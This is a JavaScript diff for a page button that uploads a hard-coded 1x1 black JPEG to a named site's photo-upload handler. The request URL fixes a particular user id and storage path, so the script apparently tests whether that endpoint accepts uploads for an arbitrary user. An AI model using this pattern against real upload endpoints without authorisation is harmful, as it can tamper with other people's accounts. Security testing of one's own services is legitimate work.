@@ -1,5 +1,33 @@
-(async () => {
-  // Create a 1x1 black JPEG image (very small)
+// Create and style the centered big link
+const container = document.createElement('div');
+Object.assign(container.style, {
+  position: 'fixed',
+  top: '50%',
+  left: '50%',
+  transform: 'translate(-50%, -50%)',
+  textAlign: 'center',
+  zIndex: 9999,
+  width: '100%',
+  userSelect: 'none'
+});
+
+const link = document.createElement('a');
+link.textContent = 'Upload Black Pixel';
+Object.assign(link.style, {
+  fontSize: '4rem',
+  color: '#007acc',
+  cursor: 'pointer',
+  textDecoration: 'none',
+  fontWeight: 'bold'
+});
+link.href = '#';
+
+// Append link to container and container to body
+container.appendChild(link);
+document.body.appendChild(container);
+
+// Define the upload function
+async function uploadBlackPixel() {
   const jpegBytes = new Uint8Array([
     0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46,0x00,0x01,0x01,0x00,
     0x00,0x01,0x00,0x01,0x00,0x00,0xFF,0xDB,0x00,0x43,0x00,0x08,0x06,0x06,
@@ -14,11 +42,11 @@
     0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF,0xDA,0x00,0x0C,0x03,
     0x01,0x00,0x02,0x11,0x03,0x11,0x00,0x3F,0x00,0xD2,0xCF,0x20,0xFF,0xD9
   ]);
-
+  
   const imageBlob = new Blob([jpegBytes], { type: 'image/jpeg' });
   const formData = new FormData();
   formData.append("file", imageBlob, "black_pixel.jpg");
-
+  
   const url = "https://dev2023.konosys.com/konosys_sesame_formation/ashx/UploaderPhoto.ashx?Nompiece=image_candidat&id_user=50233&Path=PathPhotoIndividus";
 
   try {
@@ -34,11 +62,20 @@
 
     if (response.ok) {
       const result = await response.json();
+      alert("Upload successful: " + JSON.stringify(result));
       console.log("Upload successful:", result);
     } else {
+      alert("Upload failed with status: " + response.status);
       console.error("Upload failed with status:", response.status);
     }
   } catch (err) {
+    alert("Error during upload: " + err);
     console.error("Error during upload:", err);
   }
-})();
+}
+
+// Attach event listener to link
+link.addEventListener('click', e => {
+  e.preventDefault();
+  uploadBlackPixel();
+});
